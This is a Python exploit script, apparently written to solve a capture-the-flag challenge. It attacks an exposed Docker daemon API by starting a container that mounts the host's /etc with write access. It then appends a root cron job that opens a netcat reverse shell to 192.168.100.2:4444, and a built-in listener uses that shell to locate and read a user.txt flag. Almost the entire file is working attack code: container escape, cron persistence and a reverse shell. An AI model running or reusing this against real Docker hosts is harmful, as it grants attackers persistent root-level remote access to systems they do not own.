import docker
import socket
import time
import threading
import sys
sys.stdout.reconfigure(line_buffering=True)


def inject_crontab(url):
    """Injects a cron job into the victim's crontab"""
    print("[*] Injecting crontab into the victim's container...")
    client = docker.DockerClient(base_url=url)

    raw_command = r'''sh -c "echo '* * * * * /usr/bin/nc 192.168.100.2 4444 -e /bin/sh' >> /tmp/etc/crontabs/root"'''
    client.containers.run(
        'alpine:latest',
        raw_command,
        remove=True,
        volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}},
        )
    print("[*] Crontab injected successfully.")


def setup_listener():
    host = '0.0.0.0'
    port = 4444

    print(f"[*] Setting up listener on {host}:{port}")

    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        # Bind to the port
        server_socket.bind((host, port))

        # Queue up to 5 requests
        server_socket.listen(5)
        print("[*] Listening on port 4444...")

        # Establish connection
        client_socket, addr = server_socket.accept()
        print(f"[*] Got connection from {addr}")

        # Send commands to the shell
        commands = [
            "find / -type f -name 'user.txt' 2>/dev/null",
            "cat /home/ctf/user.txt",
        ]

        print("[*] Sending commands to the shell:")
        for cmd in commands:
            print(f"[>] Executing: {cmd}")
            client_socket.send(f"{cmd}\n".encode())
            time.sleep(1)

            # Get response
            response = b""
            client_socket.settimeout(2)
            try:
                while True:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    response += data
            except socket.timeout:
                pass

            print("[<] Response:")
            print(response.decode('utf-8', errors='ignore'))

        # Close the connection
        client_socket.close()

    except Exception as e:
        print(f"[!] Error in listener: {e}")
    finally:
        server_socket.close()
        print("[*] Listener closed")

def main(url):
    print("[*] Starting docker script")


    listner_thread = threading.Thread(target=setup_listener)
    listner_thread.daemon = True
    listner_thread.start()

    crontab_thread = threading.Thread(target=inject_crontab, args=[url])
    crontab_thread.daemon = True
    crontab_thread.start()

    # Wait for threads to finish
    listner_thread.join()
    crontab_thread.join()
    print("[*] Docker script finished")
    return 0


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python exploit.py <docker_url>")
        sys.exit(1)
    docker_url = str(sys.argv[1])

    main(docker_url)
